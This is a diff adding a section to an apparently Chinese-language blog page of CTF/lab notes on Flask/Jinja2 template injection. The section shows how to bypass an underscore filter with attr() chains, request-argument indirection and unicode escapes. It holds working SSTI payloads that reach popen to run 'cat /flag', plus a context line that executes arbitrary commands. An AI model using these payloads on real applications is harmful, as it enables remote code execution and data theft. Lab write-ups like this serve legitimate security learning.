@@ -464,6 +464,22 @@ for i in range(500):
 
 code=&#123;&#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.args.qwq](request.args.cmd).read()&#125;&#125;
 </code></pre>
+<h2 id="下划线过滤"><a href="#下划线过滤" class="headerlink" title="下划线过滤"></a>下划线过滤</h2><p>过滤器绕过</p>
+<h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><p><img src="https://i0.hdslb.com/bfs/article/0099b1d9816f44c228acba8dfc5ea7d0290349942.png"></p>
+<h3 id="attr-绕过"><a href="#attr-绕过" class="headerlink" title="attr()绕过"></a>attr()绕过</h3><pre><code>
+&#123;&#123;()|attr(request.args.qwq)&#125;&#125;
+
+
+
+http://192.168.86.133:780/flasklab/level/6?class=__class__&amp;base=__base__&amp;subcl=__subclasses__&amp;number=__getitem__&amp;a=__init__&amp;b=__globals__&amp;c=__getitem__
+
+
+
+code=&#123;&#123;()|attr(request.args.class)|attr(request.args.base)|attr(request.args.subcl)()|attr(request.args.number)(117)|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)('popen')('cat /flag')|attr('read')()&#125;&#125;
+</code></pre>
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>形式和上面一样，只是经过了编码</p>
+<pre><code>code=&#123;&#123;()|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f")|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(117)|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f")|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")('popen')('cat /flag')|attr('read')()&#125;&#125;
+</code></pre>
 
         </div>
         <!-- .entry-content -->
